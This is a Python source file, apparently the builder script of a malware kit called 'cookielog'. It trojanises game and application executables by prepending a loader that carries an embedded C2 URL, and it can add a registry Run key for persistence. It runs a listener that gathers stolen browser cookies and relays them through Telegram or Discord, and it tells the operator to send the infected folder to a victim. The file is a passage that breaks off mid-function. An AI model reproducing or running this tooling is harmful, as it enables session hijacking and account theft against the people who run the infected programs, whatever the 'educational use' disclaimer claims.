#!/usr/bin/env python3
"""auto.py — one-click payload setup. Builds, starts listener, infects .exe.

  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING

  This is offensive security tooling for penetration testing, red-team
  exercises, and security education. It builds an infected executable that
  extracts browser cookies from a target machine and exfiltrates them to a
  remote C2 server.

  ONLY use this on systems you own or are explicitly authorized to test.
  Unauthorized use against third-party systems, networks, or individuals is
  illegal in most jurisdictions. The authors are not responsible for misuse.

Usage:
    python auto.py                      # GUI mode (file/folder picker)
    python auto.py game.exe             # CLI: infect standalone .exe
    python auto.py "C:\\path\\game folder"  # CLI: infect folder (game/app)
    python auto.py game.exe --run       # CLI + run infected locally (test)
    python auto.py --port 9400          # custom C2 port (default: 9090)
    python auto.py game.exe --persist   # install registry Run key on victim
    python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
    python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord

    python auto.py --config             # show saved settings (config.json)
    python auto.py --clear-telegram     # remove saved Telegram token
    python auto.py --clear-discord      # remove saved Discord webhook

    Telegram/Discord keys are saved to config.json automatically on first use.
    After that, just run:  python auto.py game.exe   (keys are loaded from config)

Output structure:
    ifec/
      folds/   <- infected exes that need their folder (games, apps with DLLs/data)
      apps/    <- standalone infected exes (no folder dependencies)

What it does:
    1. Checks if loader.exe + ckdll.dll exist; if not, runs build.bat
    2. Detects attacker's local IP for C2 URL
    3. Starts listen.py in background (HTTP listener)
    4. Infects the .exe with the embedded C2 URL
       - Folder mode: copies entire folder to ifec/folds/, infects the main .exe in place
       - Standalone mode: infects to ifec/apps/<name>.exe
    5. Without --run: prints instructions (send ifec/ to victim)
       With --run: runs the infected exe locally for testing

Press Ctrl+C to stop early.
"""
import json, os, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse

HERE   = os.path.dirname(os.path.abspath(__file__))
BIN    = os.path.join(HERE, "bin")
LOADER = os.path.join(BIN, "loader.exe")
DLL    = os.path.join(BIN, "ckdll.dll")
LOOT   = os.path.join(HERE, "loot")
IFEC   = os.path.join(HERE, "ifec")
IFEC_FOLDS = os.path.join(IFEC, "folds")
IFEC_APPS  = os.path.join(IFEC, "apps")
LISTEN = os.path.join(HERE, "listen.py")
BUILD  = os.path.join(HERE, "build.bat")
CONFIG = os.path.join(HERE, "config.json")
MAGIC  = b"CKLG"
C2_SENTINEL = b"CKC2_DEADBEEF_"
PERSIST_SENTINEL = b"CKPR____"
PERSIST_ENABLE = b"CKPR0001"

def log(msg):
    print(msg, flush=True)

# ------------------------------------------------------------------ config persistence
# config.json stores telegram token, discord webhook, default port, and persist flag.
# When --telegram / --discord is passed via CLI, it's saved automatically.
# When no flag is passed, saved values are loaded from config.json.

def load_config():
    """Load config.json. Returns dict with telegram, discord, port, persist."""
    if os.path.exists(CONFIG):
        try:
            with open(CONFIG, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_config(cfg):
    """Save config dict to config.json."""
    try:
        with open(CONFIG, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as ex:
        log("[-] failed to save config: %s" % ex)

def show_config():
    """Print current saved config."""
    cfg = load_config()
    log("=" * 50)
    log("  Saved configuration (config.json)")
    log("=" * 50)
    if not cfg:
        log("  (empty -- no saved settings)")
    else:
        tg = cfg.get("telegram", "")
        if tg:
            # Show bot token partially masked + chat ID
            parts = tg.rsplit(":", 1)
            if len(parts) == 2:
                bot, chat = parts
                masked = bot[:8] + "..." + bot[-4:] if len(bot) > 12 else bot
                log("  Telegram:  %s : %s" % (masked, chat))
            else:
                log("  Telegram:  %s" % tg)
        else:
            log("  Telegram:  (not set)")
        dc = cfg.get("discord", "")
        if dc:
            # Mask the webhook token part
            masked = dc[:50] + "..." if len(dc) > 50 else dc
            log("  Discord:   %s" % masked)
        else:
            log("  Discord:   (not set)")
        log("  Port:      %s" % cfg.get("port", 9090))
        log("  Persist:   %s" % ("enabled" if cfg.get("persist") else "disabled"))
    log("=" * 50)

def tg_lookup_chatid(bot_token):
    """Query Telegram getUpdates API to find the chat_id of the latest message sender.
    Returns (chat_id string, or None). The user must have sent a message to the bot first."""
    try:
        url = "https://api.telegram.org/bot%s/getUpdates" % bot_token
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode("utf-8"))
        if data.get("ok") and data.get("result"):
            # Get the last message's chat ID
            last = data["result"][-1]
            chat_id = last["message"]["chat"]["id"]
            return str(chat_id)
        return None
    except Exception:
        return None

def detect_ip():
    """Detect attacker's local IP (not 127.0.0.1)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip.startswith("0.") or ip.startswith("169.254."):
            return "127.0.0.1"
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"

def ensure_build():
    """Build loader.exe + ckdll.dll if they don't exist."""
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] binaries already compiled")
        return True
    if not os.path.isfile(BUILD):
        log("[-] build.bat not found")
        return False
    log("[*] building binaries (needs MSVC)...")
    r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
                       capture_output=True, text=True, timeout=60)
    if r.stdout:
        for line in r.stdout.strip().splitlines():
            log("    " + line)
    if r.stderr:
        for line in r.stderr.strip().splitlines():
            log("    [!] " + line)
    if r.returncode != 0:
        log("[-] build failed (exit %d)" % r.returncode)
        return False
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] build OK")
        return True
    log("[-] build succeeded but binaries not found")
    return False

# ------------------------------------------------------------------ exe finding

def find_main_exe(folder):
    """Find the main .exe in a folder.
    Heuristic: prefer exe whose name matches a <name>_Data/ subfolder (Unity),
    then the largest .exe, then the only .exe.
    Returns (exe_path, exe_name) or (None, None).
    """
    exes = []
    for root, dirs, files in os.walk(folder):
        # skip subfolders that are clearly not the main exe location
        for f in files:
            if f.lower().endswith(".exe"):
                exes.append(os.path.join(root, f))
    if not exes:
        return None, None
    if len(exes) == 1:
        return exes[0], os.path.basename(exes[0])

    # Try to match <name>_Data/ pattern (Unity games)
    for exe_path in exes:
        exe_name = os.path.basename(exe_path)
        stem = os.path.splitext(exe_name)[0]
        data_dir = os.path.join(folder, stem + "_Data")
        if os.path.isdir(data_dir):
            return exe_path, exe_name

    # Fallback: largest .exe (skip known helper exes)
    skip = ("unitycrashhandler", "crashpad_handler", "setup", "uninstall",
            "updater", "helper", "crashpad")
    candidates = [e for e in exes
                  if os.path.basename(e).lower().split(".")[0] not in skip
                  and not any(s in os.path.basename(e).lower() for s in skip)]
    if not candidates:
        candidates = exes
    candidates.sort(key=lambda p: os.path.getsize(p), reverse=True)
    return candidates[0], os.path.basename(candidates[0])

# ------------------------------------------------------------------ infection

def _patch_loader(loader_bytes, c2_url, persist=False):
    """Strip old appended data from loader, patch C2 + persistence sentinels. Returns patched bytes."""
    idx = loader_bytes.rfind(MAGIC)
    if idx != -1 and idx > len(loader_bytes) - 12:
        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
        loader_bytes = loader_bytes[:idx - 4 - old_len]
    if c2_url:
        sidx = loader_bytes.find(C2_SENTINEL)
        if sidx != -1:
            url_bytes = c2_url.encode("utf-8")[:255]
            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
    if persist:
        pidx = loader_bytes.find(PERSIST_SENTINEL)
        if pidx != -1:
            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
    return loader_bytes

def _extract_original_host(host_bytes):
    """If host was already infected, extract the original bytes."""
    hidx = host_bytes.rfind(MAGIC)
    if hidx != -1 and hidx > len(host_bytes) - 12:
        old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
        if old_hlen > 0 and hidx - 4 - old_hlen > 0:
            log("[*] host was already infected -- extracting original")
            return host_bytes[hidx - 4 - old_hlen : hidx - 4]
    return host_bytes

def build_infected_bytes(host_path, c2_url, persist=False):
    """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
    with open(LOADER, "rb") as f:
        loader_bytes = f.read()
    with open(host_path, "rb") as f:
        host_bytes = f.read()
    loader_bytes = _patch_loader(loader_bytes, c2_url, persist)
    host_bytes = _extract_original_host(host_bytes)
    return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC

def build_infected_standalone(host_path, c2_url, persist=False):
    """Infect a standalone .exe -> ifec/apps/<name>.exe"""
    os.makedirs(IFEC_APPS, exist_ok=True)
    bname = os.path.basename(host_path)
    out_path = os.path.join(IFEC_APPS, bname)
    infected = build_infected_bytes(host_path, c2_url, persist)
    with open(out_path, "wb") as f:
        f.write(infected)
    return out_path

def build_infected_folder(host_dir, c2_url, persist=False):
    """Copy folder to ifec/folds/<folder_name>/, infect the main .exe in place.

    Returns (out_exe_path, original_exe_path) or (None, None) if no .exe found.
    """
    exe_path, exe_name = find_main_exe(host_dir)
    if not exe_path:
        log("[-] no .exe found in folder: %s" % host_dir)
        return None, None

    log("[+] main exe: %s (%d KB)" % (exe_name, os.path.getsize(exe_path) // 1024))

    folder_name = os.path.basename(os.path.abspath(host_dir))
    dest_folder = os.path.join(IFEC_FOLDS, folder_name)

    # if destination already exists, remove it (fresh copy)
    if os.path.exists(dest_folder):
        log("[*] removing old copy: ifec/folds/%s/" % folder_name)
        shutil.rmtree(dest_folder, ignore_errors=True)

    log("[*] copying folder to ifec/folds/%s/ ..." % folder_name)
    shutil.copytree(host_dir, dest_folder)
    log("[+] folder copied (%.1f MB)" % (
        sum(os.path.getsize(os.path.join(r,f))
            for r,_,fs in os.walk(dest_folder) for f in fs) / 1048576))

    # infect the exe in place: overwrite the copy with the infected version
    dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
    infected = build_infected_bytes(exe_path, c2_url, persist)
    with open(dest_exe, "wb") as f:
        f.write(infected)

    log("[+] infected in place: ifec/folds/%s/%s" % (folder_name,
        os.path.relpath(exe_path, host_dir)))
    log("    original: %d KB -> infected: %d KB" % (
        os.path.getsize(exe_path) // 1024, len(infected) // 1024))

    return dest_exe, exe_path

# ------------------------------------------------------------------ listener

def start_listener(port, telegram=None, discord=None):
    """Start listen.py in background. Returns the process handle.
    If telegram or discord are provided, listen.py relays received cookies to them.
    Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
    closing the main terminal). Output is also written to loot/listener.log."""
    os.makedirs(LOOT, exist_ok=True)
    # clean old loot
    for f in ["cookies.json", "cookies.txt", "session_cookies.json", "session_cookies.txt",
              "listener.log"]:
        p = os.path.join(LOOT, f)
        if os.path.exists(p):
            os.remove(p)
    cmd = [sys.executable, "-u", LISTEN, str(port)]
    if telegram:
        cmd += ["--telegram", telegram]
    if discord:
        cmd += ["--discord", discord]
    proc = subprocess.Popen(
        cmd,
        cwd=HERE,
        creationflags=0x00000010  # CREATE_NEW_CONSOLE — listener gets its own window
    )
    time.sleep(2)
    if proc.poll() is not None:
        log("[-] listener failed to start")
        return None
    log("[+] listener on port %d (PID=%d)" % (port, proc.pid))
    return proc

def wait_for_cookies(timeout=300):
    """Wait for cookies.json to appear in loot/. Print summary when done."""
    json_path = os.path.join(LOOT, "cookies.json")
    log("[*] waiting for cookies (timeout=%ds, Ctrl+C to stop)..." % timeout)
    start = time.time()
    while time.time() - start < timeout:
        if os.path.isfile(json_path) and os.path.getsize(json_path) > 10:
            try:
                with open(json_path, encoding="utf-8") as f:
                    data = json.load(f)
                if data:
                    log("\n[+] %d cookies received!" % len(data))
                    log("    -> %s (%d bytes)" % (json_path, os.path.getsize(json_path)))
                    txt_path = os.path.join(LOOT, "cookies.txt")
                    if os.path.isfile(txt_path):
                        log("    -> %s (%d bytes)" % (txt_path, os.path.getsize(txt_path)))
                    # top domains
                    top = {}
                    for c in data:
                        d = c.get("domain", "?")
                        top[d] = top.get(d, 0) + 1
                    log("\n    top domains:")
                    for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
                        log("      %5d  %s" % (n, d))
                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/cookies.json")
                    return True
            except (json.JSONDecodeError, IOError):
                pass
        time.sleep(1)
    log("[-] timeout -- no cookies received in %ds" % timeout)
    log("    check: is the listener running? is the C2 URL correct?")
    log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
    return False

# ------------------------------------------------------------------ local test run

def run_infected_locally(host_path, infected_path, is_folder=False):
    """Run the infected exe locally for testing.

    For standalone exe: copy infected over original, run, wait, restore.
    For folder exe: just run from ifec/folds/ (the folder copy is self-contained).
    """
    if is_folder:
        # Folder mode: the infected exe is already in ifec/folds/<name>/
        # with all its dependencies. Just run it directly.
        log("[*] launching infected exe from ifec/folds/ ...")
        wdir = os.path.dirname(infected_path)
        proc = subprocess.Popen([infected_path], cwd=wdir)
        log("[+] process started (PID=%d)" % proc.pid)
        _wait_and_cleanup(proc, infected_path, os.path.basename(infected_path))
        return

    # Standalone mode: backup original, copy infected over, run, restore
    backup = host_path + ".orig"
    shutil.copy2(host_path, backup)
    log("[+] backed up original: %s" % backup)

    shutil.copy2(infected_path, host_path)
    log("[+] copied infected exe to: %s" % host_path)

    log("[*] launching infected exe...")
    proc = subprocess.Popen([host_path])
    log("[+] loader started (PID=%d)" % proc.pid)

    _wait_and_cleanup(proc, host_path, os.path.basename(host_path), backup)

def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
    """Wait for game to open, kill loader, wait for payload, kill game, restore."""
    loader_pid = proc.pid

    # wait for the game/app to open, then kill the loader
    log("[*] waiting 10s for game to open + payload to start...")
    time.sleep(10)
    try:
        proc.terminate()
        log("[*] loader terminated (PID=%d)" % loader_pid)
    except Exception:
        log("[!] could not terminate loader")

    # wait for payload to finish (extraction + HTTP exfiltration)
    log("[*] waiting 25s for payload extraction + HTTP exfil...")
    time.sleep(25)

    # kill the game process — it holds the file lock on host_path
    log("[*] killing game process (%s)..." % exe_name)
    try:
        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                       shell=True, timeout=5)
    except Exception:
        pass

    # kill orphaned child processes of the dead loader (hollowed cmd.exe)
    try:
        ps_cmd = (
            'Get-CimInstance Win32_Process | '
            'Where-Object { $_.ParentProcessId -eq %d } | '
            'ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }'
        ) % loader_pid
        subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    time.sleep(2)

    # restore original (standalone mode only)
    if backup:
        for attempt in range(5):
            try:
                shutil.copy2(backup, host_path)
                os.remove(backup)
                log("[+] original .exe restored")
                break
            except Exception:
                if attempt < 4:
                    log("[!] file locked, retrying in 3s... (%d/5)" % (attempt + 1))
                    try:
                        subprocess.run('taskkill /F /IM "%s" >nul 2>&1' % exe_name,
                                       shell=True, timeout=3)
                    except Exception:
                        pass
                    time.sleep(3)
                else:
                    log("[!] could not restore original after 5 attempts")
                    log("    backup at: %s" % backup)
                    log("    restore manually: copy /b \"%s\" \"%s\"" % (backup, host_path))

    # clean up temp file from rename-restore
    wdir = os.path.dirname(host_path)
    bak_tmp = os.path.join(wdir, "~ck_bak.bin")
    if os.path.exists(bak_tmp):
        try: os.remove(bak_tmp)
        except Exception: pass

# ------------------------------------------------------------------ GUI

def pick_gui():
    """Open a GUI dialog. Returns (path, mode, run, telegram, discord, persist).
    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool."""
    try:
        import tkinter as tk
        from tkinter import filedialog, ttk
        root = tk.Tk()
        root.title("cookielog -- auto infector")
        root.geometry("560x560")
        root.configure(bg="#1a1a1a")
        style = ttk.Style()
        style.theme_use("clam")
        style.configure(".", background="#1a1a1a", foreground="#d4d4d4",
                        font=("Segoe UI", 10))
        style.configure("TLabel", background="#1a1a1a", foreground="#d4d4d4")
        style.configure("TButton", background="#2d2d2d", foreground="#d4d4d4",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("Act.TButton", background="#1a6b1a", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("Warn.TButton", background="#6b3a1a", foreground="#ffffff",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#d4d4d4",
                        insertcolor="#d4d4d4")
        style.configure("TCheckbutton", background="#1a1a1a", foreground="#d4d4d4")
        result = {"path": None, "mode": None, "run": False,
                  "telegram": None, "discord": None, "persist": False}

        # Load saved config to pre-fill fields
        cfg = load_config()

        # Educational use notice
        ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
                  font=("Segoe UI", 8, "bold"),
                  foreground="#cc6600").pack(pady=(0, 5))

        ttk.Label(root, text="cookielog -- auto infector",
                  font=("Segoe UI", 14, "bold"),
                  foreground="#4a9eff").pack(pady=(15, 5))
        ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
                  font=("Segoe UI", 9)).pack(pady=(0, 12))

        def do_folder():
            d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                _save_and_close()

        def do_folder_run():
            d = filedialog.askdirectory(title="Select folder to infect AND run locally")
            if d:
                result["path"] = d
                result["mode"] = "folder"
                result["run"] = True
                _save_and_close()

        def do_file():
            f = filedialog.askopenfilename(
                title="Select standalone .exe to infect",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                _save_and_close()

        def do_file_run():
            f = filedialog.askopenfilename(
                title="Select .exe to infect AND run locally",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                result["mode"] = "file"
                result["run"] = True
                _save_and_close()

        def _save_and_close():
            # Read fields before closing
            tg_val = tg_var.get().strip()
            dc_val = dc_var.get().strip()
            if tg_val:
                result["telegram"] = tg_val
            if dc_val:
                result["discord"] = dc_val
            result["persist"] = persist_var.get()

            # Save to config.json
            cfg_new = load_config()
            if tg_val:
                cfg_new["telegram"] = tg_val
            else:
                cfg_new.pop("telegram", None)
            if dc_val:
                cfg_new["discord"] = dc_val
            else:
                cfg_new.pop("discord", None)
            cfg_new["persist"] = bool(persist_var.get())
            save_config(cfg_new)

            root.destroy()

        # Folder buttons (green = recommended for games)
        ttk.Button(root, text="SELECT FOLDER (game/app with files)",
                   style="Act.TButton", command=do_folder).pack(pady=3, fill="x", padx=40)
        ttk.Button(root, text="SELECT FOLDER + RUN LOCALLY (test)",
                   style="Warn.TButton", command=do_folder_run).pack(pady=3, fill="x", padx=40)

        ttk.Separator(root).pack(fill="x", padx=40, pady=8)

        # Standalone exe buttons
        ttk.Button(root, text="SELECT .EXE (standalone, no folder)",
                   command=do_file).pack(pady=3, fill="x", padx=40)
        ttk.Button(root, text="SELECT .EXE + RUN LOCALLY (test)",
                   command=do_file_run).pack(pady=3, fill="x", padx=40)

        # --- Relay config section ---
        ttk.Separator(root).pack(fill="x", padx=40, pady=(12, 5))
        relay_header = tk.Frame(root, bg="#1a1a1a")
        relay_header.pack(fill="x", padx=40, pady=(0, 5))
        ttk.Label(relay_header, text="Relay (saved to config.json)",
                  font=("Segoe UI", 9, "bold"),
                  foreground="#4a9eff").pack(side="left")

        def save_relay():
            """Save relay fields to config.json without closing the window."""
            tg_val = tg_var.get().strip()
            dc_val = dc_var.get().strip()
            cfg_new = load_config()
            if tg_val:
                cfg_new["telegram"] = tg_val
            else:
                cfg_new.pop("telegram", None)
            if dc_val:
                cfg_new["discord"] = dc_val
            else:
                cfg_new.pop("discord", None)
            cfg_new["persist"] = bool(persist_var.get())
            save_config(cfg_new)
            # Update status labels
            if tg_val:
                tg_status.config(text="ON", foreground="#4a9eff")
            else:
                tg_status.config(text="OFF", foreground="#666666")
            if dc_val:
                dc_status.config(text="ON", foreground="#4a9eff")
            else:
                dc_status.config(text="OFF", foreground="#666666")
            save_status.config(text="saved!", foreground="#4a9eff")
            root.after(2000, lambda: save_status.config(text=""))

        def toggle_tg():
            """Toggle Telegram relay on/off (clears the field to disable)."""
            if tg_var.get().strip():
                # Has value -> clear it (disable)
                tg_var.set("")
                tg_status.config(text="OFF", foreground="#666666")
            else:
                # Empty -> restore from config if available
                saved = load_config().get("telegram", "")
                if saved:
                    tg_var.set(saved)
                    tg_status.config(text="ON", foreground="#4a9eff")
                else:
                    tg_status.config(text="set key first", foreground="#cc6600")

        def toggle_dc():
            """Toggle Discord relay on/off."""
            if dc_var.get().strip():
                dc_var.set("")
                dc_status.config(text="OFF", foreground="#666666")
            else:
                saved = load_config().get("discord", "")
                if saved:
                    dc_var.set(saved)
                    dc_status.config(text="ON", foreground="#4a9eff")
                else:
                    dc_status.config(text="set key first", foreground="#cc6600")

        # Telegram row
        tg_frame = tk.Frame(root, bg="#1a1a1a")
        tg_frame.pack(fill="x", padx=40, pady=2)
        ttk.Label(tg_frame, text="Telegram:", width=10).pack(side="left")
        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
        ttk.Entry(tg_frame, textvariable=tg_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
        tg_status = tk.Label(tg_frame, text="ON" if tg_var.get() else "OFF",
                             bg="#1a1a1a", fg="#4a9eff" if tg_var.get() else "#666666",
                             font=("Segoe UI", 8, "bold"), width=5)
        tg_status.pack(side="left")
        ttk.Button(tg_frame, text="Toggle", width=6, command=toggle_tg).pack(side="left", padx=(4, 0))

        # Discord row
        dc_frame = tk.Frame(root, bg="#1a1a1a")
        dc_frame.pack(fill="x", padx=40, pady=2)
        ttk.Label(dc_frame, text="Discord:", width=10).pack(side="left")
        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
        ttk.Entry(dc_frame, textvariable=dc_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
        dc_status = tk.Label(dc_frame, text="ON" if dc_var.get() else "OFF",
                             bg="#1a1a1a", fg="#4a9eff" if dc_var.get() else "#666666",
                             font=("Segoe UI", 8, "bold"), width=5)
        dc_status.pack(side="left")
        ttk.Button(dc_frame, text="Toggle", width=6, command=toggle_dc).pack(side="left", padx=(4, 0))

        # Save button + status
        save_frame = tk.Frame(root, bg="#1a1a1a")
        save_frame.pack(fill="x", padx=40, pady=(4, 0))
        ttk.Button(save_frame, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
        save_status = tk.Label(save_frame, text="", bg="#1a1a1a", fg="#4a9eff",
                               font=("Segoe UI", 9))
        save_status.pack(side="left", padx=(8, 0))

        # Persistence checkbox
        persist_frame = tk.Frame(root, bg="#1a1a1a")
        persist_frame.pack(fill="x", padx=40, pady=(6, 0))
        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))
        ttk.Checkbutton(persist_frame, text="Persistence (registry Run key on victim)",
                        variable=persist_var).pack(side="left")

        # Hint text
        ttk.Label(root,
                  text="Tip: run  python tg_chatid.py <bot_token>  to get your Telegram chat ID",
                  font=("Segoe UI", 8),
                  foreground="#888888").pack(pady=(8, 0))

        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=8)
        root.mainloop()
        return (result["path"], result["mode"], result["run"],
                result.get("telegram"), result.get("discord"), result.get("persist", False))
    except Exception as ex:
        log("[!] GUI not available (%s)" % ex)
        return None, None, False, None, None, False

# ------------------------------------------------------------------ interactive terminal

def print_help():
    """Print all available commands."""
    log("")
    log("=" * 60)
    log("  cookielog -- command list")
    log("=" * 60)
    log("")
    log("  TARGET:")
    log("    infect <path>         Infect a folder or .exe (auto-detect)")
    log("    infect <path> --run   Infect + run locally (test)")
    log("    gui                   Open the GUI picker (folder/exe selection)")
    log("")
    log("  RELAY:")
    log("    telegram <token:chat> Set Telegram relay (saved to config)")
    log("    discord <webhook_url> Set Discord relay (saved to config)")
    log("    relay                 Show relay status (active/off)")
    log("    clear-telegram        Remove saved Telegram token")
    log("    clear-discord         Remove saved Discord webhook")
    log("")
    log("  OPTIONS:")
    log("    port <number>         Set C2 port (default: 9090, saved to config)")
    log("    persist on|off        Enable/disable persistence (registry Run key)")
    log("    config                Show current saved configuration")
    log("    tg-chatid <token>     Find your Telegram chat ID")
    log("")
    log("  BUILD / TEST:")
    log("    build                 Compile loader.exe + ckdll.dll (needs MSVC)")
    log("    install               Run install.bat (dependency installer)")
    log("    test-listener         Start listener + send fake cookies (verify it works)")
    log("")
    log("  HELP:")
    log("    help                  Show this command list")
    log("    exit / quit           Exit cookielog")
    log("")
    log("  SHORTCUT: you can also pass CLI args directly, e.g.:")
    log("    python auto.py \"GET UPSTAIRS (64bit)\" --run --persist")
    log("")
    log("=" * 60)
    log("")

def interactive_loop():
    """Interactive terminal mode. Loops until user types exit/quit."""
    log("=" * 60)
    log("  cookielog -- interactive terminal")
    log("  type 'help' for command list, 'exit' to quit")
    log("=" * 60)

    # Pre-load config
    cfg = load_config()
    port = cfg.get("port", 9090)
    telegram = cfg.get("telegram")
    discord = cfg.get("discord")
    persist = cfg.get("persist", False)

    while True:
        try:
            # Show prompt
            tg_hint = " [TG]" if telegram else ""
            dc_hint = " [DC]" if discord else ""
            ps_hint = " [PERSIST]" if persist else ""
            prompt = "\ncookielog%s%s%s> " % (tg_hint, dc_hint, ps_hint)
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            log("\n[*] exiting")
            break

        if not line:
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        rest = parts[1].strip() if len(parts) > 1 else ""

        # --- commands ---
        if cmd in ("exit", "quit", "q"):
            log("[*] bye")
            break

        elif cmd == "help" or cmd == "?":
            print_help()

        elif cmd == "config":
            show_config()

        elif cmd == "tg-chatid":
            if not rest:
                log("usage: tg-chatid <bot_token>")
                log("example: tg-chatid 8975447629:AAFzK9wam_2jfoZ...")
            else:
                log("[*] looking up chat ID...")
                chat_id = tg_lookup_chatid(rest)
                if chat_id:
                    full = "%s:%s" % (rest, chat_id)
                    telegram = full
                    cfg["telegram"] = full
                    save_config(cfg)
                    log("[+] Chat ID: %s" % chat_id)
                    log("[+] Saved to config. Telegram relay is now active.")
                else:
                    log("[-] No messages found. Send a message to your bot first, then retry.")

        elif cmd == "telegram":
            if not rest:
                log("usage: telegram <bot_token:chat_id>")
                log("tip: run 'tg-chatid <bot_token>' to find your chat ID")
            else:
                telegram = rest
                cfg["telegram"] = rest
                save_config(cfg)
                log("[+] Telegram relay set and saved to config")

        elif cmd == "discord":
            if not rest:
                log("usage: discord <webhook_url>")
            else:
                discord = rest
                cfg["discord"] = rest
                save_config(cfg)
                log("[+] Discord relay set and saved to config")

        elif cmd == "clear-telegram":
            telegram = None
            cfg.pop("telegram", None)
            save_config(cfg)
            log("[+] Telegram relay cleared")

        elif cmd == "clear-discord":
            discord = None
            cfg.pop("discord", None)
            save_config(cfg)
            log("[+] Discord relay cleared")

        elif cmd == "port":
            if not rest or not rest.isdigit():
                log("usage: port <number> (current: %d)" % port)
            else:
                port = int(rest)
                cfg["port"] = port
                save_config(cfg)
                log("[+] Port set to %d (saved to config)" % port)

        elif cmd == "persist":
            if rest.lower() == "on":
                persist = True; cfg["persist"] = True; save_config(cfg)
                log("[+] Persistence: enabled (saved)")
            elif rest.lower() == "off":
                persist = False; cfg["persist"] = False; save_config(cfg)
                log("[+] Persistence: disabled (saved)")
            else:
                log("usage: persist on|off (current: %s)" % ("on" if persist else "off"))

        elif cmd == "build":
            log("[*] running build.bat...")
            ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
            if ret == 0:
                log("[+] build OK")
            else:
                log("[-] build failed (exit %d)" % ret)

        elif cmd == "install":
            log("[*] running install.bat...")
            subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)

        elif cmd == "test-listener":
            # Start listener on a test port and send fake cookies
            test_port = port
            log("[*] starting listener on port %d for test..." % test_port)
            listener = start_listener(test_port, telegram, discord)
            if not listener:
                log("[-] could not start listener")
                continue
            time.sleep(1)
            try:
                fake = '[{"domain":"test.com","name":"test_cookie","value":"abc123","path":"/","expirationDate":0,"sameSite":"None","secure":false,"httpOnly":false,"hostOnly":true,"session":true}]'
                import urllib.request as ur
                req = ur.Request("http://127.0.0.1:%d/" % test_port,
                                 data=fake.encode(),
                                 headers={"Content-Type": "application/json"})
                resp = ur.urlopen(req, timeout=5)
                log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
                # Check if loot was written
                jp = os.path.join(LOOT, "cookies.json")
                if os.path.exists(jp) and os.path.getsize(jp) > 10:
                    log("[+] loot/cookies.json written (%d bytes)" % os.path.getsize(jp))
                    sp = os.path.join(LOOT, "session_cookies.json")
                    if os.path.exists(sp):
                        log("[+] loot/session_cookies.json written (%d bytes)" % os.path.getsize(sp))
                    log("[+] listener is working!")
                else:
                    log("[-] listener responded but no loot file written")
            except Exception as ex:
                log("[-] listener test failed: %s" % ex)
            listener.terminate()

        elif cmd == "relay":
            # Toggle relay on/off (doesn't clear saved keys, just enables/disables)
            if not telegram and not discord:
                log("[-] no relay configured. Use 'telegram <token:chat>' or 'discord <url>' first.")
            else:
                # Show current state
                log("  Telegram: %s" % ("active" if telegram else "off"))
                log("  Discord:  %s" % ("active" if discord else "off"))
                log("  to disable: clear-telegram / clear-discord")
                log("  to re-enable: telegram <token:chat> / discord <url>")
                log("  (keys are saved in config.json, just re-enter to re-activate)")

        elif cmd == "gui":
            # Launch GUI picker, then run the full flow
            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
            if not host_path:
